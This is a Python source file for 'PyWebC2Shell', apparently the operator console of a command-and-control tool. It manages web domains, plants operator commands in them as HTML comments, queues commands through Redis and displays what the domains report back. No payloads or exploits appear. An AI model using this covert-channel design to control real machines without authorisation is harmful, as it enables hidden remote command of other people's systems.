import typer
import typer_shell
from domain_orchestrator import DomainOrchestrator
import redis
from typing_extensions import Annotated

# Libraries that are used to handle graceful shutdowns
import signal
import atexit
import sys

# Modules that handle the transmission of commands
import command as c

# Library to tranlsate timestamps from the messages
from datetime import datetime

# TODO: Add the rich help panel for functions that have different arguements: https://typer.tiangolo.com/tutorial/options/help/#cli-options-help-panels
# TODO: At some point, it could be valuable to create a separate redis manager class with a single client, but for now, leave it and keep goign


class PyWebC2Shell:
    def __init__(self) -> None:
        # Initialize the typer shell as part of the class
        self.app = typer_shell.make_typer_shell()
        self.dorch = DomainOrchestrator()
        # Redis client to be able to subscribe to the streams that are output
        self.redis_client = redis.Redis()
        self.monitoring = False
        self.monitor_thread = None
        # Reload all of the previously stored applications
        self.dorch.startup_domains()
        # Register the shutdown handlers
        self._register_shutdown_handlers()
        # NOTE: Any new commands that are added MUST be registered here otherwise they will not run
        self.app.command()(self.create)
        self.app.command()(self.remove)
        self.app.command()(self.list)
        self.app.command()(self.pause)
        self.app.command()(self.resume)
        self.app.command()(self.read)
        self.app.command()(self.command)
        self.app.command()(self.queue)

    def create(
        self,
        domain: str,
        port: Annotated[
            int,
            typer.Option(help="The port number you would like the domain to run from"),
        ] = 8000,
    ):
        """Create a new domain"""
        print("Usage: create <domain> [port]")

        self.dorch.create_domain(domain, ".com", port)

    def remove(self, domain: str):
        """Remove a domain"""
        self.dorch.remove_domain(domain)

    def list(
        self,
        active: Annotated[
            bool,
            typer.Option(
                help="Show all of the active domains with broadcasting streams"
            ),
        ] = False,
        paused: Annotated[
            bool,
            typer.Option(help="Show all of the paused domains"),
        ] = False,
    ):
        """Lists domains"""
        if active:
            self.dorch.print_domains(self.dorch.get_running_domains())
            return

        if paused:
            self.dorch.print_domains(self.dorch.get_paused_domains())
            return

        all_domains = [
            (domain, info) for domain, info in self.dorch.get_all_domains().items()
        ]
        self.dorch.print_domains(all_domains)

    def pause(self, domain: str):
        """Pause a domain"""
        self.dorch.pause_domain(domain)

    def resume(self, domain: str):
        """Resume a paused domain"""
        self.dorch.resume_domain(domain)

    def queue(self, domain: str, commands: str):
        """Takes a command, or a list of commands and queues them for a given domain"""

        if domain not in self.dorch.get_all_domains():
            print(
                "ERROR: Domain provided is not an available domain, use the list command to see all domains "
            )
        if domain not in self.dorch.get_running_domains():
            print(
                "WARNING: The domain that this command is queued to is not actively running"
            )
        # Get all of hte commands
        command_list = commands.split(",")
        print(command_list)
        if c.queue_commands(domain, self.redis_client, command_list):
            print(f"SUCCESS: Commands:{command_list} sucessfully queued")
        c.get_queued_commands(domain, self.redis_client)

    def command(self, domain: str, command: str):
        """Insert an HTML comment as a command into a domain"""

        if domain not in self.dorch.get_all_domains():
            print(
                "ERROR: Domain provided is not an available domain use the list command to see all domains"
            )
            return
        # Clear the domain of any existing commands then insert

        if c.insert_HTML_comment(domain, command):
            print(f"{command} sucessfully inserted into {domain}")
        else:
            print("Command was not able to be inserted into the domain")

    # TODO: Add the functionality in read to write outputs to another file
    # TODO: Implement the History functionality as well
    def read(
        self,
        domain: str,
        listen: Annotated[
            bool,
            typer.Option(
                help="Listen and display any new messages that are sent to the domain"
            ),
        ] = True,
        history: Annotated[
            int,
            typer.Option(
                help="Shows the n most previous messages that were sent, by default this sends an entire log"
            ),
        ] = 0,
    ):
        """Reads from a broadcast stream in order to obtain messages for a specific domain"""
        # List the available streams to lisen to, these are all active domains that are currently running
        # FIXME: For sure refactor this code such that the redis read functinoality is not all inside of here
        available_streams = [domain for domain, _ in self.dorch.get_running_domains()]

        # Append the 'all' stream, this is a stream that all domains also send their information to
        if available_streams:
            available_streams.append("all")
        else:
            print(
                "There are no current broadcast streams available to run, please create or resume one"
            )

        # Ensure that the domain provided is a domain that is an available stream
        if domain not in available_streams:
            print(
                "ERROR: Domain provided is not an available domain use the list --available command to see all available streams"
            )
            return

        # After these checks, it is assumed that the user passed in a domain to check, so:
        stream_name = domain

        if listen:
            # Save the original SIGINT handler and temporarily replace with default
            original_sigint_handler = signal.signal(
                signal.SIGINT, signal.default_int_handler
            )

            try:
                last_id = "$"  # Start from new messages only
                while True:
                    # Get new messages from the stream
                    messages = self.redis_client.xread(
                        {stream_name: last_id}, count=1, block=1000
                    )

                    if messages:
                        for stream, msgs in messages:  # type: ignore
                            for msg_id, fields in msgs:
                                # Extract message data, timestamp, and domain
                                message_data = fields[b"message"].decode("utf-8")
                                timestamp = float(fields[b"ts"].decode("utf-8"))
                                domain = fields[b"domain"].decode("utf-8")

                                # Format timestamp
                                formatted_time = datetime.fromtimestamp(
                                    timestamp
                                ).strftime("%Y-%m-%d %H:%M:%S")

                                # Display with timestamp and domain
                                print(f"[{formatted_time}] [{domain}] {message_data}")

                                last_id = msg_id

            except KeyboardInterrupt:
                print(f"\nStopped listeningto broadcast stream '{stream_name}'")
            finally:
                # Restore the original SIGINT handler
                signal.signal(signal.SIGINT, original_sigint_handler)

    def run(self):
        """Runs the typer app as we are calling it inside of a class"""
        self.app()

    ## Functions for the graceful shutting down of the application in the case of an error ##

    def _register_shutdown_handlers(self):
        """Register handlers to ensure graceful shutdown on various exit scenarios"""
        # Register atexit handler for normal Python exit
        atexit.register(self._cleanup_on_exit)

        # Register signal handlers for abrupt termination
        signal.signal(signal.SIGINT, self._signal_handler)  # Ctrl+C
        signal.signal(signal.SIGTERM, self._signal_handler)  # Termination signal

    def _cleanup_on_exit(self):
        """Cleanup function called on exit"""
        try:
            print("\nPerforming graceful shutdown...")
            self.dorch.shutdown_domains()
            print("Shutdown complete.")
        except Exception as e:
            print(f"Error during shutdown: {e}")

    def _signal_handler(self, signum, frame):
        """Handle termination signals"""
        print(f"\nReceived signal {signum}. Shutting down gracefully...")
        self._cleanup_on_exit()
        sys.exit(0)


def main():
    shell = PyWebC2Shell()
    # Run application for typer shell
    shell.run()


if __name__ == "__main__":
    main()
